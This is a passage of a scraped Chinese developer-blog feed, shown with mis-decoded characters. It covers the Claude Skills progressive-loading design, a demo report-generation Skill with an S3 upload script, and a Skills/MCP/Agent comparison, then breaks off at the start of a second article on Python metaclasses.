<p><strong>ä»»åŠ¡å¹²æ‰°ä¸¥é‡</strong>ï¼šæ— å…³Skillçš„å†…å®¹ä¼šå ç”¨ä¸Šä¸‹æ–‡ï¼Œæ¯”å¦‚ç”Ÿæˆå‘¨æŠ¥æ—¶åŠ è½½äº†éœ€æ±‚åˆ†æçš„è§„åˆ™ï¼Œå¯èƒ½å¯¼è‡´Claudeè¯¯è§£éœ€æ±‚ï¼Œé™ä½æ‰§è¡Œç²¾å‡†åº¦ï¼›</p>
</li>
<li>
<p><strong>é€»è¾‘å†²çªé£é™©</strong>ï¼šä¸åŒSkillçš„æ‰§è¡Œè§„åˆ™å¯èƒ½å­˜åœ¨é‡å ï¼ˆæ¯”å¦‚éƒ½æœ‰æ ¼å¼æ ¡éªŒæ­¥éª¤ï¼‰ï¼Œå…¨é‡åŠ è½½ä¼šè®©Claudeéš¾ä»¥åˆ¤æ–­æ‰§è¡Œä¼˜å…ˆçº§ï¼Œå½±å“è¾“å‡ºç¨³å®šæ€§ã€‚</p>
</li>
</ul>
<p>é’ˆå¯¹è¿™äº›é—®é¢˜ï¼ŒClaude Skillsé‡‡ç”¨**æ¸è¿›å¼æŠ«éœ²ï¼ˆProgressive Disclosureï¼‰**æ¶æ„ï¼Œæ ¸å¿ƒæ€è·¯æ˜¯ï¼š<strong>ä¸ä¸€æ¬¡æ€§åŠ è½½æ‰€æœ‰Skillå†…å®¹ï¼Œè€Œæ˜¯å…ˆåŒ¹é…éœ€æ±‚ï¼Œå†æŒ‰éœ€é€æ­¥åŠ è½½å¯¹åº”å†…å®¹</strong>ï¼Œæ ¸å¿ƒè½½ä½“æ˜¯â€œä¸‰å±‚åŠ è½½æ¨¡å‹â€ï¼š</p>
<p>| å±‚çº§ | å†…å®¹ | ä½œç”¨ |</p>
<p>|  -------  |  -------------------------------  |  --------  |</p>
<p>| Level 1ï¼ˆåˆå§‹åŠ è½½ï¼‰ | å„Skillçš„name + descriptionï¼ˆå…ƒæ•°æ®ï¼‰ |  <strong>æ„å›¾åŒ¹é…</strong>ï¼šå¿«é€ŸåŒ¹é…ç”¨æˆ·éœ€æ±‚ï¼Œç¡®å®šæ˜¯å¦éœ€è¦è°ƒç”¨æŸä¸ªSkillï¼Œä¸å ç”¨è¿‡å¤šä¸Šä¸‹æ–‡ |</p>
<p>| Level 2ï¼ˆç¡®å®šè°ƒç”¨åï¼‰ | ç›®æ ‡Skillçš„SKILL.mdæ ¸å¿ƒæ‰§è¡ŒæŒ‡ä»¤ |  <strong>æ‰§è¡Œè§„åˆ™</strong>ï¼šæ˜ç¡®è¯¥Skillçš„æ‰§è¡Œæ­¥éª¤ï¼Œå®Œæˆæ ¸å¿ƒä»»åŠ¡æµç¨‹ |</p>
<p>| Level 3ï¼ˆæŒ‰éœ€åŠ è½½ï¼‰ | ç›®æ ‡Skillçš„scripts/ templates/ resourcesç­‰é…å¥—èµ„æº |  <strong>æŒ‰éœ€åŠ è½½</strong>ï¼šè¡¥å……è¾…åŠ©èµ„æºï¼Œä»…åœ¨éœ€è¦æ—¶åŠ è½½ï¼Œé¿å…æ— å…³å†…å®¹å¹²æ‰° |</p>
<p><strong>æ¸è¿›å¼æ¶æ„çš„æ ¸å¿ƒä¼˜åŠ¿</strong></p>
<ul>
<li>
<p><strong>æ”¯æŒå¤§é‡ Skill å…±å­˜</strong>ï¼šå³ä½¿ä½ æœ‰åå‡ ä¸ªã€å‡ åä¸ª Skillï¼Œåˆå§‹ä¹ŸåªåŠ è½½å…ƒæ•°æ®ï¼Œä¸ä¼šå æ»¡ä¸Šä¸‹æ–‡ï¼›</p>
</li>
<li>
<p><strong>å¹²æ‰°æœ€å°åŒ–</strong>ï¼šåªåŠ è½½å½“å‰ä»»åŠ¡ç›¸å…³çš„ Skill å†…å®¹ï¼Œæ‰§è¡Œæ›´ç²¾å‡†ã€æ•ˆç‡æ›´é«˜ï¼›</p>
</li>
<li>
<p><strong>å¯ç»„åˆè°ƒåº¦</strong>ï¼šå¤šä¸ª Skill å¯ä»¥æŒ‰å±‚çº§ä¾æ¬¡åŠ è½½ã€ä¸²è”æ‰§è¡Œï¼Œè½»æ¾å®ç°å¤æ‚å·¥ä½œæµã€‚</p>
</li>
</ul>
<hr/>
<h2 data-id="heading-5">å››ã€Skills çš„ä½¿ç”¨æ–¹å¼</h2>
<p>Claude Skills æ”¯æŒä¸¤ç§ä¸»æµä½¿ç”¨æ–¹å¼ï¼Œè¦†ç›–æ—¥å¸¸åŠå…¬å’ŒæŠ€æœ¯é›†æˆåœºæ™¯ï¼š</p>
<h3 data-id="heading-6">4.1 æ¡Œé¢ç«¯ / CLI ç«¯ï¼ˆæ—¥å¸¸åŠå…¬ç”¨ï¼‰</h3>
<ul>
<li>
<p>è‡ªåŠ¨è§¦å‘ï¼šä½ è¾“å…¥éœ€æ±‚åï¼ŒClaude è‡ªåŠ¨åŒ¹é…å¯¹åº”çš„ Skillï¼ˆæ ¹æ® name + descriptionï¼‰ï¼Œæ— éœ€æ‰‹åŠ¨è°ƒç”¨ï¼›</p>
</li>
<li>
<p>æ˜¾å¼è°ƒç”¨ï¼šå¦‚æœéœ€è¦æŒ‡å®š Skillï¼Œç›´æ¥è¾“å…¥/skill-name å‘½ä»¤å³å¯ï¼ˆæ¯”å¦‚ /report-automationï¼‰ï¼›</p>
</li>
<li>
<p>å‚æ•°ä¼ é€’ï¼šå¯ä»¥ç”¨è‡ªç„¶è¯­è¨€è¾“å…¥å‚æ•°ï¼ˆæ¯”å¦‚â€œç”Ÿæˆäº§å“ç»ç†çš„æœ¬å‘¨å‘¨æŠ¥ï¼Œå†…å®¹åŒ…æ‹¬ï¼šéœ€æ±‚è¯„å®¡3æ¬¡ã€åŸå‹è®¾è®¡2ä¸ªã€ç”¨æˆ·è®¿è°ˆ5äººâ€ï¼‰ï¼Œä¹Ÿå¯ä»¥ç”¨ç»“æ„åŒ–æ ¼å¼ï¼ˆå¦‚ JSONï¼‰ä¼ é€’ï¼Œæ›´ç²¾å‡†ã€‚</p>
</li>
</ul>
<h3 data-id="heading-7">4.2 API é›†æˆï¼ˆæŠ€æœ¯åŒå­¦ç”¨ï¼Œæ”¯æŒè‡ªåŠ¨åŒ–éƒ¨ç½²ï¼‰</h3>
<p>å¦‚æœéœ€è¦æŠŠ Skill é›†æˆåˆ°è‡ªå·±çš„ç³»ç»Ÿã€å·¥å…·ä¸­ï¼Œå¯ä»¥é€šè¿‡ Claude API è°ƒç”¨ï¼Œç¤ºä¾‹ä»£ç ï¼ˆPythonï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python">
response = claude_client.messages.create(

model=<span class="hljs-string">"claude-3-opus"</span>,

messages=[{<span class="hljs-string">"role"</span>:  <span class="hljs-string">"user"</span>,  <span class="hljs-string">"content"</span>:  <span class="hljs-string">"å¸®æˆ‘ç”Ÿæˆæœ¬å‘¨çš„å‘¨æŠ¥"</span>}],

tools=[{<span class="hljs-string">"type"</span>:  <span class="hljs-string">"skill"</span>,  <span class="hljs-string">"skill_id"</span>:  <span class="hljs-string">"report-automation"</span>}]

)

</code></pre>
<blockquote>
<p>æ³¨ï¼šä½¿ç”¨å‰éœ€è¦å…ˆåœ¨ Claude å¼€å‘è€…å¹³å°åˆ›å»º Skillï¼Œè·å–å¯¹åº”çš„ skill_idï¼Œå¹¶é…ç½®å¥½ API å¯†é’¥</p>
</blockquote>
<hr/>
<h2 data-id="heading-8">äº”ã€Demo æ¡ˆä¾‹ï¼šæ—¥æŠ¥ / å‘¨æŠ¥ / æœˆæŠ¥è‡ªåŠ¨ç”Ÿæˆ Skill</h2>
<p>è¿™é‡Œåˆ†äº«ä¸€ä¸ª Skills Demo æ¡ˆä¾‹ï¼šè‡ªåŠ¨ç”Ÿæˆæ—¥æŠ¥/å‘¨æŠ¥/æœˆæŠ¥ã€‚</p>
<h3 data-id="heading-9">1. æ˜ç¡®åŠŸèƒ½éœ€æ±‚</h3>
<ul>
<li>
<p>æ¥æ”¶ç”¨æˆ·è¾“å…¥çš„å·¥ä½œå†…å®¹ï¼Œè‡ªåŠ¨è¯†åˆ«æŠ¥å‘Šç±»å‹ï¼ˆæ—¥/å‘¨/æœˆï¼‰ï¼›</p>
</li>
<li>
<p>æŒ‰é¢„è®¾æ¨¡æ¿ç”Ÿæˆç»“æ„åŒ– Markdown æŠ¥å‘Šï¼›</p>
</li>
<li>
<p>æ”¯æŒå°†ç”Ÿæˆçš„æŠ¥å‘Šè‡ªåŠ¨ä¸Šä¼ åˆ° S3 å­˜å‚¨ï¼Œç”Ÿæˆå¯è®¿é—®çš„é“¾æ¥ã€‚</p>
</li>
</ul>
<h3 data-id="heading-10">2. ç›®å½•ç»“æ„è®¾è®¡</h3>
<pre><code class="hljs language-text" lang="text">
report-generator/

â”œâ”€â”€ SKILL.md

â”œâ”€â”€ resources/

â”‚ â”œâ”€â”€ daily_report_template.md

â”‚ â”œâ”€â”€ weekly_report_template.md

â”‚ â””â”€â”€ monthly_report_template.md

â”œâ”€â”€ scripts/

â”‚ â””â”€â”€ upload_report.py

</code></pre>
<h3 data-id="heading-11">3. æ ¸å¿ƒæ–‡ä»¶å®ç°</h3>
<h4 data-id="heading-12">SKILL.md æ ¸å¿ƒæŒ‡ä»¤</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2dc6767ae4054c1e9629fce3996f9aa1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aWH6Iie57K-6YCJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769606990&amp;x-signature=r4bQdITunKU8bC9seSeczzzEawE%3D" alt="SKILL.md" loading="lazy"/></p>
<h4 data-id="heading-13">scripts è„šæœ¬ <code>upload_report.py</code></h4>
<pre><code class="hljs language-python" lang="python">
<span class="hljs-keyword">import</span> sys

<span class="hljs-keyword">import</span> os

<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime

<span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path

<span class="hljs-keyword">from</span> dotenv <span class="hljs-keyword">import</span> load_dotenv

<span class="hljs-keyword">import</span> boto3

  

load_dotenv(Path(__file__).parent /  <span class="hljs-string">'.env'</span>)

  

report_type = sys.argv[<span class="hljs-number">1</span>].lower()

report_content =  <span class="hljs-built_in">open</span>(sys.argv[<span class="hljs-number">3</span>],  <span class="hljs-string">'r'</span>,  encoding=<span class="hljs-string">'utf-8'</span>).read()  <span class="hljs-keyword">if</span>  <span class="hljs-built_in">len</span>(

sys.argv)  &gt;=  <span class="hljs-number">4</span>  <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">2</span>]  ==  <span class="hljs-string">"-f"</span>  <span class="hljs-keyword">else</span>  <span class="hljs-string">"  "</span>.join(sys.argv[<span class="hljs-number">2</span>:])

  

S3_ENDPOINT  = os.environ.get(<span class="hljs-string">"S3_ENDPOINT"</span>)

S3_BUCKET  = os.environ.get(<span class="hljs-string">"S3_BUCKET"</span>)

S3_REGION  = os.environ.get(<span class="hljs-string">"S3_REGION"</span>,  <span class="hljs-string">"us-east-1"</span>)

S3_ACCESS_KEY  = os.environ.get(<span class="hljs-string">"S3_ACCESS_KEY"</span>)

S3_SECRET_KEY  = os.environ.get(<span class="hljs-string">"S3_SECRET_KEY"</span>)

  
  

filename =  <span class="hljs-string">f"<span class="hljs-subst">{report_type}</span>/<span class="hljs-subst">{datetime.now():%Y-%m-%d}</span>/<span class="hljs-subst">{report_type}</span>_report_<span class="hljs-subst">{datetime.now():%Y%m%d_%H%M%S}</span>.md"</span>

  

client_config =  {<span class="hljs-string">'region_name'</span>:  S3_REGION,

<span class="hljs-string">'aws_access_key_id'</span>:  S3_ACCESS_KEY,  <span class="hljs-string">'aws_secret_access_key'</span>:  S3_SECRET_KEY}

<span class="hljs-keyword">if</span>  S3_ENDPOINT:

client_config[<span class="hljs-string">'endpoint_url'</span>]  =  S3_ENDPOINT

s3 = boto3.client(<span class="hljs-string">'s3'</span>,  **client_config)

  
  

<span class="hljs-keyword">try</span>:

s3.put_object(Bucket=S3_BUCKET,  Key=filename,  Body=report_content.encode(<span class="hljs-string">'utf-8'</span>),  ContentType=<span class="hljs-string">'text/markdown; charset=utf-8'</span>,

ContentEncoding=<span class="hljs-string">'utf-8'</span>,  Metadata={<span class="hljs-string">'report-type'</span>: report_type,  <span class="hljs-string">'upload-time'</span>: datetime.now().isoformat()})

<span class="hljs-comment"># ç”Ÿæˆè®¿é—®é“¾æ¥å¹¶æ‰“å°</span>

s3_url =  <span class="hljs-string">f"<span class="hljs-subst">{S3_ENDPOINT  <span class="hljs-keyword">or</span>  <span class="hljs-string">f'https://<span class="hljs-subst">{S3_BUCKET}</span>.s3.<span class="hljs-subst">{S3_REGION}</span>.amazonaws.com'</span>}</span>/<span class="hljs-subst">{filename}</span>"</span>

<span class="hljs-built_in">print</span>(<span class="hljs-string">"ä¸Šä¼ æˆåŠŸ:"</span>, s3_url)

<span class="hljs-keyword">except</span>  Exception  <span class="hljs-keyword">as</span> e:

<span class="hljs-built_in">print</span>(<span class="hljs-string">"ä¸Šä¼ å¤±è´¥:"</span>, e)

exit(<span class="hljs-number">1</span>)

</code></pre>
<h4 data-id="heading-14">æ¨¡æ¿ç¤ºä¾‹ï¼ˆdaily.mdï¼‰</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f427851641924b7fae3b109e986ea7bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aWH6Iie57K-6YCJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769606990&amp;x-signature=jpCDFlLf%2BngFgRxuVN4YnnMouDk%3D" alt="daily æ¨¡ç‰ˆç¤ºä¾‹" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-15">4. æµ‹è¯•æµç¨‹</h3>
<p>æ­å»ºå®Œæˆåï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸¤æ­¥æµ‹è¯•éªŒè¯ Skill æ•ˆæœï¼š</p>
<ol>
<li>è¾“å…¥å†…å®¹ï¼Œç”ŸæˆæŠ¥å‘Š</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a3903b2a7fd24a8eb99b2e4c67e9ce78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aWH6Iie57K-6YCJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769606990&amp;x-signature=xXaM9Te9tVJ%2Foqsy6gIXElagimc%3D" alt="ç”ŸæˆæŠ¥å‘Š" loading="lazy"/></p>
<ol start="2">
<li>ä¸Šä¼ æŠ¥å‘Š</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1288cc30ec34d24a879c54e8b7e8ec5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aWH6Iie57K-6YCJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769606990&amp;x-signature=0UtagOLgezXWA%2FRw4FO7%2Fv90g50%3D" alt="ä¸Šä¼ æŠ¥å‘Š" loading="lazy"/></p>
<h2 data-id="heading-16">å…­ã€Skills ä¸ MCP / Agent çš„å¯¹æ¯”</h2>
<p>å¾ˆå¤šäººä¼šæ··æ·† Skillsã€MCP å’Œ Agentï¼Œè¿™é‡Œç”¨ä¸€å¼ è¡¨æ¸…æ™°åŒºåˆ†ä¸‰è€…çš„æ ¸å¿ƒå·®å¼‚ï¼Œé¿å…ç”¨é”™åœºæ™¯ï¼š</p>
<p>| å¯¹æ¯”ç»´åº¦ | Claude Skills | MCP | Agent |</p>
<p>|  ----  |  ---------------------  |  -----------  |  ------------------------------------  |</p>
<p>| å®šä¹‰ | å¯å¤ç”¨çš„ä¸šåŠ¡èƒ½åŠ›æ¨¡å— | æ¨¡å‹è®¿é—®å¤–éƒ¨ç³»ç»Ÿçš„åè®® | æ‰§è¡Œä»»åŠ¡çš„æ™ºèƒ½ä½“ |</p>
<p>| ç›®æ ‡ | æ ‡å‡†åŒ–æµç¨‹ã€å¯å¤ç”¨ | æ‰“é€šå¤–éƒ¨æ•°æ®ä¸æ“ä½œ | è‡ªä¸»å®Œæˆå¤æ‚ä»»åŠ¡ |</p>
<p>| å·¥ä½œæ–¹å¼ | è¢«åŠ¨è§¦å‘ â†’ æ‰§è¡ŒæŒ‡ä»¤ â†’ ä½¿ç”¨æ¨¡æ¿/èµ„æº | è¯·æ±‚-å“åº”æ¨¡å¼ | ç†è§£ä»»åŠ¡ â†’ åˆ¶å®šè®¡åˆ’ â†’ è°ƒç”¨ Tools/Skills â†’ è°ƒæ•´ç­–ç•¥ |</p>
<p>| ä½¿ç”¨åœºæ™¯ | é‡å¤æ€§ã€ç»“æ„åŒ–ä»»åŠ¡ | å¤–éƒ¨æ•°æ®è®¿é—®ã€ç³»ç»Ÿæ“ä½œ | å¤æ‚ã€å¤šæ­¥éª¤ä»»åŠ¡æˆ–è·¨ç³»ç»Ÿé›†æˆ |</p>
<p>æ€»ç»“ä¸€ä¸‹ï¼šä¸‰è€…ä¸æ˜¯æ›¿ä»£å…³ç³»ï¼Œè€Œæ˜¯äº’è¡¥å…³ç³»â€”â€”Agent è´Ÿè´£â€œç»Ÿç­¹è§„åˆ’â€ï¼ŒSkills è´Ÿè´£â€œå…·ä½“æ‰§è¡Œâ€ï¼ŒMCP è´Ÿè´£â€œæ‰“é€šå¤–éƒ¨ç³»ç»Ÿâ€ï¼Œå…±åŒæ„æˆå¯æ‰©å±•çš„æ™ºèƒ½è‡ªåŠ¨åŒ–æ¶æ„ã€‚</p>
<hr/>
<h2 data-id="heading-17">ä¸ƒã€æ€»ç»“ï¼šSkills çš„æ ¸å¿ƒä»·å€¼ä¸é€‚ç”¨åœºæ™¯</h2>
<p>Claude Skills çš„æ ¸å¿ƒä»·å€¼ï¼Œåœ¨äºæŠŠâ€œäººçš„ç»éªŒå’Œæ‰§è¡Œé€»è¾‘â€è½¬åŒ–ä¸ºå¯å¤ç”¨ã€æ ‡å‡†åŒ–çš„ AI èƒ½åŠ›æ¨¡å—ï¼Œè§£å†³äº†ä¼ ç»Ÿ Prompt ä¸ç¨³å®šã€ä¸å¯å¤ç”¨ã€ä¸å¯ç»„åˆçš„ç—›ç‚¹ã€‚</p>
<p>å¦‚æœä½ æœ‰ä»¥ä¸‹ä½¿ç”¨åœºæ™¯ï¼Œå¼ºçƒˆå»ºè®®å°è¯•ç”¨ Skills ä¼˜åŒ–ï¼š</p>
<ul>
<li>
<p>éœ€è¦åå¤åšåŒç±»å‹çš„ç»“æ„åŒ–ä»»åŠ¡ï¼ˆå¦‚å†™å‘¨æŠ¥ã€æ•´ç†ä¼šè®®çºªè¦ã€æ ¼å¼åŒ–æ–‡æ¡£ï¼‰ï¼›</p>
</li>
<li>
<p>éœ€è¦å°†å¤šä¸ªç®€å•ä»»åŠ¡ä¸²è”æˆè‡ªåŠ¨åŒ–å·¥ä½œæµï¼Œæå‡æ•ˆç‡ã€‚</p>
</li>
</ul>
<hr/>
<h2 data-id="heading-18">å…«ã€å‚è€ƒèµ„æ–™</h2>
<p>å®˜æ–¹æ–‡æ¡£
<a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.claude.com%2Fdocs%2Fzh-CN%2Fagents-and-tools%2Fagent-skills%2Foverview" target="_blank" title="https://platform.claude.com/docs/zh-CN/agents-and-tools/agent-skills/overview" ref="nofollow noopener noreferrer">platform.claude.com/docs/zh-CN/â€¦</a></p>
<p>API è°ƒç”¨æŒ‡å—
<a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.claude.com%2Fdocs%2Fen%2Fbuild-with-claude%2Fskills-guide" target="_blank" title="https://platform.claude.com/docs/en/build-with-claude/skills-guide" ref="nofollow noopener noreferrer">platform.claude.com/docs/en/buiâ€¦</a></p>
<p>æœ€ä½³å®è·µ
<a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.claude.com%2Fdocs%2Fen%2Fagents-and-tools%2Fagent-skills%2Fbest-practices" target="_blank" title="https://platform.claude.com/docs/en/agents-and-tools/agent-skills/best-practices" ref="nofollow noopener noreferrer">platform.claude.com/docs/en/ageâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[pythonçš„metaclasså…³é”®å­—è¯¦è§£]]></title>    <link>https://juejin.cn/post/7597679732364410922</link>    <guid>https://juejin.cn/post/7597679732364410922</guid>    <pubDate>2026-01-21T13:55:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597679732364410922" data-draft-id="7597634458697515014" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="pythonçš„metaclasså…³é”®å­—è¯¦è§£"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-21T13:55:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å“ˆé‡Œè°¢é¡¿"/> <meta itemprop="url" content="https://juejin.cn/user/3678304397695056"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            pythonçš„metaclasså…³é”®å­—è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3678304397695056/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å“ˆé‡Œè°¢é¡¿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T13:55:34.000Z" title="Wed Jan 21 2026 13:55:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>metaclasså…¶å®å°±æ˜¯æœ€å¸¸ç”¨çš„å…ƒç±»ï¼Œä¹Ÿå°±æ˜¯ï¼šåˆ›å»ºç±»çš„ç±»</p>
<h2 data-id="heading-0">1 ä½œç”¨</h2>
<p>å…ƒç±»ä¸€èˆ¬ç”¨æ¥ï¼š</p>
<ul>
<li>éªŒè¯ä¸çº¦æŸ
åœ¨ç±»åˆ›å»ºæ—¶æ£€æŸ¥å®ƒæ˜¯å¦ç¬¦åˆç‰¹å®šçš„è§„èŒƒã€‚ä¾‹å¦‚ï¼šå¼ºåˆ¶å­ç±»å¿…é¡»æ‹¥æœ‰æŸä¸ªå±æ€§ï¼Œæˆ–è€…æ–¹æ³•åå¿…é¡»ä»¥æŸç§æ ¼å¼å‘½åã€‚</li>
<li>åŠ¨æ€ä¿®æ”¹ç±»
åœ¨ç±»æ­£å¼ç”Ÿæˆä¹‹å‰ï¼ŒåŠ¨æ€åœ°ä¸ºç±»å¢åŠ æ–¹æ³•ã€ä¿®æ”¹å±æ€§åã€æˆ–è€…æ”¹å˜ç»§æ‰¿å…³ç³»ã€‚</li>
<li>è‡ªåŠ¨æ³¨å†Œ
åœ¨æ¡†æ¶å¼€å‘ä¸­ï¼Œå…ƒç±»å¸¸ç”¨æ¥è‡ªåŠ¨è®°å½•å“ªäº›ç±»ç»§æ‰¿äº†åŸºç±»ã€‚ä¾‹å¦‚æ’ä»¶ç³»ç»Ÿä¸­ï¼Œåªè¦ä½ å®šä¹‰ä¸€ä¸ªç±»ï¼Œå…ƒç±»å°±ä¼šè‡ªåŠ¨æŠŠå®ƒåŠ å…¥åˆ°å·²æ¿€æ´»çš„æ’ä»¶åˆ—è¡¨ä¸­ã€‚</li>
<li>å®ç°ç‰¹å®šé¢†åŸŸçš„DSL
